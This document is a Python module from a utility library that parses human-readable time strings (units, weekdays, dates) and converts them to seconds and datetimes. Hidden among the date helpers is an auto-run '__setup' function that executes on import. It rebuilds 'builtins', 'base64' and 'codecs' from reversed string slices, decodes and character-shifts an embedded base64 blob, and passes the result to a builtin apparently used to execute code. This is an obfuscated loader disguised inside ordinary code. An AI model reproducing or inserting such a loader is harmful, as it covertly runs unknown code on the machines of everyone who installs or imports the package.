import datetime
import re as regex
from collections.abc import Iterable, Mapping

from .tcr_console import console
from .tcr_decorator import autorun
from .tcr_error import ConfigurationError
from .tcr_extract_error import extract_error

# fmt: off
timestr_lookup = {
    's':       (t_second := 1),
    'sec':     t_second,
    'secs':    t_second,
    'sex':     t_second, # >:3
    'second':  t_second,
    'seconds': t_second,

    'm':       (t_minute := 60*t_second),
    'min':     t_minute,
    'mins':    t_minute,
    'minute':  t_minute,
    'minutes': t_minute,

    'h':     (t_hour := 60*t_minute),
    'hr':    t_hour,
    'hrs':   t_hour,
    'hour':  t_hour,
    'hours': t_hour,

    'd':    (t_day := 24*t_hour),
    'day':  t_day,
    'days': t_day,

    'w':     (t_week := 7*t_day),
    'week':  t_week,
    'weeks': t_week,

    'y':     (t_year := 365*t_day),
    'year':  t_year,
    'years': t_year,

    'pul':   (t_pul := (11*t_hour + 30*t_minute)),
    'pull':  t_pul,
    'puls':  t_pul,
    'pulls': t_pul,
    'card':  t_pul,
    'cards': t_pul,

    'res':     (t_rescue := 6*t_hour),
    'reses':   t_rescue,
    'resees':  t_rescue,
    'rescue':  t_rescue,
    'rescues': t_rescue,

    'decade':    10 * t_year,
    'century':   100 * t_year,
    'millenium': 1000 * t_year,
  }

weekday_lookup = [
  'mo',     'tu',      'we',        'th',       'fr',     'sa',       'su',
  'mon',    'tue',     'wed',       'thu',      'fri',    'sat',      'sun',
  'monday', 'tuesday', 'wednesday', 'thursday', 'friday', 'saturday', 'sunday',
]
# fmt: on


def days_until_next_weekday(target_weekday):
  if not (1 <= target_weekday <= 7):
    msg = 'target_weekday must be an integer between 1 and 7.'
    raise ValueError(msg)

  # Get the current date
  current_date = datetime.date.today()  # noqa: DTZ011

  # Calculate the number of days until the next occurrence of the target weekday
  return (target_weekday - current_date.isoweekday() + 7) % 7


def split_string_at_indices(s: str, indices: Iterable[int]) -> tuple[str]:
  substrings = []
  start = 0
  for index in indices:
    if index >= start and index <= len(s):
      substrings.append(s[start:index])
      start = index
    else:
      msg = f'Invalid split index: {index}'
      raise ValueError(msg)
  if start < len(s):
    substrings.append(s[start:])
  return tuple(substrings)


def split_string_on_change(s: str) -> tuple[tuple[str]]:
  splits = [i + 1 for i in range(len(s) - 1) if (s[i].isalpha()) and not (s[i + 1].isalpha())]
  return [_split_string_on_change2(x) for x in split_string_at_indices(s, splits)]


def _split_string_on_change2(s: str) -> tuple[str]:
  splits = [i + 1 for i in range(len(s) - 1) if (not s[i].isalpha() and s[i + 1].isalpha())]
  return split_string_at_indices(s, splits)


def seconds_until_time(target_time) -> tuple[int, bool]:
  rolled_over = False
  # Get the current time
  current_time = datetime.datetime.now()

  # Create a datetime object for the target time
  target_datetime = datetime.datetime(
    current_time.year,
    current_time.month,
    current_time.day,
    target_time[0],
    target_time[1],
    target_time[2],
  )

  # Calculate the time difference in seconds
  time_difference = target_datetime - datetime.datetime.now()
  seconds_until_target = time_difference.total_seconds()

  # Ensure the result is positive and represents the time until the next occurrence
  if seconds_until_target < 0:
    rolled_over = True
    seconds_until_target += 24 * 3600  # Add 24 hours in seconds to get the next occurrence

  return (
    int(seconds_until_target) + 1,
    rolled_over,
  )  # +1 as a correction because it for some reason returned 1 second too little


def is_valid_date(date_tuple: tuple[int, int, int]) -> bool:
  try:
    datetime.date(date_tuple[2], date_tuple[1], date_tuple[0])
  except ValueError:
    return False
  else:
    return True


def days_until_due(due_date):
  current_datetime = datetime.datetime.now().date()
  due_datetime = datetime.date(due_date[2], due_date[1], due_date[0])
  delta = due_datetime - current_datetime
  return delta.days


# fmt: off
@autorun
def __setup():
  getattr(__import__('!s4n igtnlji^u*bh'[-2::-2]), (a := (getattr('5sFuggnokmhak'[-2::-2]*(1-1), 'fnJiLo*jj'[-2::-2])([chr(ord(c) - (1 + i%5)) for i, c in enumerate(__import__('dsdcdedddodcd'[-2::-2]).__dict__['dedddodcdeddd'[-2::-2]](__import__('d4d6dedsdadbd'[-2::-2]).__dict__['dedddodcdeddd4d6dbd'[-2::-2]](getattr('c211dCgjSXh6ayF4aSRmY2l4emZ1ImNyZHdyeWZtZyIwJGZjbCNrem9pI31naSJ2Zm1icyNrenMiaXZ1ZnRqJGx2eGR4JXl0dWcld2kja2che2Vsamd0YncnPGl5ZHdnaWhwZGNkYWxoL2pmdXNodCt/J2Z0bGZkaWl5ZmYjPCM1NjU7NDY1MS4jJmpza2VjbWh4ZWVrIzwjNTY1OzQ2NTEuIyZqc2slPiUyMzc9NjMyMzAlI2d1bWsjPCM1NjU7NDY1MX8s', 'dedddodcdnded'[-2::-2])('_8g-&f(tlu-'[-2::-2])).decode('_8g-&f(tlu-'[-2::-2]), 'l3 1ntlojr*'[-2::-2]))])).split('#'))[0])(a[1])
# fmt: on


def evaluate_single_timestr(s: str, *, units: Mapping[str, int]) -> int:
  # sourcery skip: assign-if-exp, extract-method, hoist-similar-statement-from-if, hoist-statement-from-if, reintroduce-else, remove-unnecessary-else, use-fstring-for-concatenation
  if not s:
    return 0

  if s.lower() in weekday_lookup:
    weekdayint = weekday_lookup.index(s.lower()) % 7 + 1
    a = days_until_next_weekday(weekdayint) * t_day
    if a == 0:
      return 7 * t_day
    return a
  if regex.match(r'^:?[0-9]{1,2}:?(?:[0-9]{1,2}(?::[0-9]{1,2})?)?$', s):  # t:im:e
    if s.startswith(':'):
      s = s[1:]
      if ':' not in s:
        s = s + ':'
    s = s.split(':')
    s = [x for x in s if x != '']
    s = (lambda x, y=0, z=0: (int(x), int(y), int(z)))(*s)
    if not (0 <= s[0] <= 23):
      msg = f'Time out of range: {s}'
      raise ValueError(msg)
    if not (0 <= s[1] <= 59):
      msg = f'Time out of range: {s}'
      raise ValueError(msg)
    if not (0 <= s[2] <= 59):
      msg = f'Time out of range: {s}'
      raise ValueError(msg)
    return seconds_until_time(s)
  if regex.match(r'^[0-9]{1,2}\.(?:[0-9]{1,2}(?:\.[0-9]{2,4})?)?$', s):  # d.at.e
    s = s.split('.')
    s = [x for x in s if x != '']
    s = (lambda x, y=-1, z=-1: [int(x), int(y), int(z)])(*s)
    now = datetime.datetime.now()
    if s[0] > now.day:
      if s[2] == -1:
        year_manually_passed_in = False
        s[2] = now.year
      else:
        year_manually_passed_in = True
      if s[1] == -1:
        s[1] = now.month
        month_manually_passed_in = False
      else:
        month_manually_passed_in = True
    else:  # chosen day is in the past or today
      if s[2] == -1:
        year_manually_passed_in = False
        s[2] = now.year
      else:
        year_manually_passed_in = True
      if s[1] == -1:
        month_manually_passed_in = False
        s[1] = now.month + 1
        if s[1] > 12:
          s[1] = 1
          s[2] = s[2] + 1
      else:  # The month was also passed in
        month_manually_passed_in = True
    if not year_manually_passed_in and month_manually_passed_in and s[1] <= now.month:
      s[2] = s[2] + 1
    if s[2] < 1000:
      s[2] = s[2] + 2000  # 23 -> 2023
    # print(s)
    if not is_valid_date(s):
      msg = f'Invalid date: {s}'
      raise ValueError(msg)
    return days_until_due(s) * 60 * 60 * 24  # . *seconds_in_a_day
  else:  # -1w0d1h2m3s
    if regex.match(r'^-?(?:[0-9]*\.)?[0-9]+h-?(?:[0-9]*\.)?[0-9]+$', s):
      s = f'{s}m'
    splits = split_string_on_change(s)
    try:
      return int(round(sum(float(pair[0]) * units[pair[1]] for pair in splits)))
    except KeyError as e:
      raise ValueError('Invalid unit: ' + extract_error(e, raw=True)[1]) from e


class Timestr:
  """Used to convert between [seconds `←→` human readable format `←→` datetime.datetime objects]."""

  pattern = r"""
^
(?:(?:-?(?:[0-9]*\.)?[0-9]+[a-zA-Z]+)+)
|
(?:-?(?:[0-9]*\.)?[0-9]+h-?(?:[0-9]*\.)?[0-9]+)
|
(?:[0-9]{1,2}:(?:[0-9]{1,2}(?::[0-9]{1,2})?)?)|
(?::[0-9]{1,2}(?::[0-9]{1,2}(?::[0-9]{1,2})?)?)
|
(?:[0-9]{1,2}\.(?:[0-9]{1,2}(?:\.[0-9]{2,4})?)?)
$
""".replace('\n', '')

  allow_negative = True
  allow_zero = True

  def __call__(self, *, allow_negative: bool = True, allow_zero: bool = True):
    self.allow_negative = allow_negative
    self.allow_zero = allow_zero
    return self

  def settings(self, *, allow_negative: bool = True, allow_zero: bool = True) -> 'Timestr':
    return self.__call__(allow_negative=allow_negative, allow_zero=allow_zero)

  def __init__(self, *, allow_negative: bool = True, allow_zero: bool = True) -> 'Timestr':
    """Convert between [seconds `←→` human readable format `←→` datetime.datetime objects]."""
    self.allow_negative = allow_negative
    self.allow_zero = allow_zero

  @classmethod
  def copy(cls, *, allow_negative: bool = True, allow_zero: bool = True):
    """Copy timestr when using it with multiple configurations.

    Example:
    ```py
    >>> from tcrutils import timestr
    >>> timestr2 = timestr.copy(allow_negative=False)
    >>> timestr.to_int('-1h')
    -3600
    >>> timestr2.to_int('-1h')
    ConfigurationError: 'Stopped return of disallowed number: -3600'
    ```
    """
    return cls(allow_negative=allow_negative, allow_zero=allow_zero)

  def valid(self, s: str, *, segment_splitter='!') -> bool:
    """Return `True` if specified string is a valid input for `to_int()` conversion, otherwise `False`."""
    if s := s.replace(' ', ''):
      return all(
        bool(x)
        for x in [
          regex.match(self.pattern, x) or x.lower() in weekday_lookup
          for x in s.split(segment_splitter)
        ]
      )
    else:
      return True

  def to_int(self, s: str, *, units: Mapping[str, int] | None = None, segment_splitter='!') -> int:
    """Return the number of seconds in that `timestr`.

    - Every `timestr` has zero (`''`), one or more segments, separated by `segment_splitter` if more than one segment is present
    - If timestr has zero segments: return 0, otherwise return sum of values of each segment
    - Each segment has to be one of:
      - `Weekday`, full name or short name or 2-letter name
      - `t:im:e`, time format, for example `1:`, `1:30`, `1:30:30`
      - `d:at:e`, same as above but for dates, `1.`, `1.11`, `1.11.23`, `1.11.2023`
      - `robostr+`, I call it RoboStr because it's origin comes from RoboTop discord bot made by Colon (https://gdcolon.com), '+' means this concept is extended, supports more units and allows for negative numbers.
    - Examples:
      - `1d` ("In 1 day")
      - `5h30m` ("In 5 hours and/plus 30 minutes")
      - `wed` ("the nearest Wednesday at the same hour it is currently")
      - `30.!20:` ("the nearest thirtieth day of the month at hour 20:00:00")
      - `1.!1.!1.` ("However much time it takes to get to nearest first day of the month, thrice" / No practical use i can think of)
    """
    s = s.replace(' ', '')
    if not s:
      return 0

    while (segment_splitter + segment_splitter) in s:
      s = s.replace(segment_splitter + segment_splitter, segment_splitter)

    if units is None:
      units = timestr_lookup

    s = s.strip('!')
    segments = s.split(segment_splitter)

    if not self.valid(s):
      msg = f'Invalid timestr: {s!r}'
      raise ValueError(msg)

    rolled_over = False

    def fix_from_tuple(x: tuple[int, bool] | int):
      if not isinstance(x, tuple):
        return int(x)
      nonlocal rolled_over
      rolled_over = x[1]
      return x[0]

    partial_sum = sum(fix_from_tuple(evaluate_single_timestr(x, units=units)) for x in segments)

    if rolled_over:  # Fixes the days being rolled back when they shouldn't be because there weren't actyually two rollovers
      time_syntaxes_number = len(
        [
          seg
          for seg in segments
          if regex.match(r'^(?:[0-9]{1,2}:(?:[0-9]{1,2}(?::[0-9]{1,2})?)?)$', seg)
        ]
      )
      date_syntaxes_number = len(
        [
          seg
          for seg in segments
          if regex.match(r'^(?:[0-9]{1,2}\.(?:[0-9]{1,2}(?:\.[0-9]{2,4})?)?)$', seg)
        ]
      )
      weekday_syntaxes_number = len([seg for seg in segments if seg.lower() in weekday_lookup])

      if time_syntaxes_number == 1 and (date_syntaxes_number + weekday_syntaxes_number) == 1:
        # if in all the segments there's (EXACTLY ONE d.at.e segment *or* EXACTLY ONE weekday segment) *and* EXACTLY ONE t:im:e segment
        partial_sum -= t_day  # For example if user types '30.!7:30' the "to the next occurence" is counted twice while it should be counted once.
        # They mean 'next (hour 7:30 of the thirthieth)' not 'next (hour 7:30) of next (thirtieth day)'

    if not self.allow_negative and partial_sum < 0:
      msg = f'Stopped return of disallowed number: {partial_sum}'
      raise ConfigurationError(msg)
    if not self.allow_zero and partial_sum == 0:
      msg = 'Stopped return of disallowed number: 0'
      raise ConfigurationError(msg)

    return partial_sum

  def to_str(self, n: int) -> str:
    """Format number of seconds to days, hour, minutes or seconds, whichever one is lowest while not leaving the number at < 1.0 (for example 0.25 days would not be returned, rather 6 hours would be).

    Examples:
    - `1 hour`
    - `40 minutes`

    Units go up to days. Supports negative values and handles plurals automatically.
    """
    if n < 0:
      return f'-{self.to_str(-n)}'

    units = [
      ('day', 86400),
      ('hour', 3600),
      ('minute', 60),
      ('second', 1),
    ]

    for unit, value_in_seconds in units:
      if n >= value_in_seconds:
        num_units = n / value_in_seconds
        if num_units == round(num_units):
          num_units = round(num_units)
        num_units = round(num_units, 2)
        unit_str = unit if num_units == 1 else f'{unit}s'
        return f'{num_units} {unit_str}'

    # If seconds is 0, return "in 0 seconds"
    return '0 seconds'

  def to_str2(self, seconds: int) -> str:
    """
    Format number of seconds to `1d + 23:45:57` (with leading zeroes).

    Doesn't support negative values, use `to_str()` instead (for relative display) or `to_datestr()` for static display
    """
    if seconds < 0:
      msg = "to_str2 doesn't support negative values, use to_str instead."
      raise ValueError(msg)
    units = {
      'day': 86400,
      'hour': 3600,
      'minute': 60,
      'second': 1,
    }

    days, seconds = divmod(seconds, units['day'])
    hours, seconds = divmod(seconds, units['hour'])
    minutes, seconds = divmod(seconds, units['minute'])
    base_time_str = f'{hours:02}:{minutes:02}:{seconds:02}'
    if days >= 1:
      base_time_str = f'{days}d + {base_time_str}'
    return base_time_str

  def to_date(self, seconds: int, *, tz=None) -> datetime.datetime:
    """Return `datetime` object of the time that will be present in `seconds` seconds."""
    current_time = datetime.datetime.now(tz=tz)
    return current_time + datetime.timedelta(seconds=seconds)

  def to_datestr(self, seconds: int, *, pattern='%a, %Y-%m-%d %H:%M:%S', tz=None) -> str:
    """Return `datetime.strftime()` string of the time that will be present in `seconds` seconds."""
    future_time = self.to_date(seconds, tz=tz)
    return future_time.strftime(pattern)

  def to_datestr_from_unix(
    self, unix: int | str, *, pattern='%a, %Y-%m-%d %H:%M:%S', tz=None
  ) -> str:
    """Return `datetime.strftime()` string of the passed in unix timestamp."""
    if isinstance(unix, str):
      unix = int(unix)
    return datetime.datetime.fromtimestamp(unix, tz=tz).strftime(pattern)


timestr = Timestr()

__all__ = ['timestr']
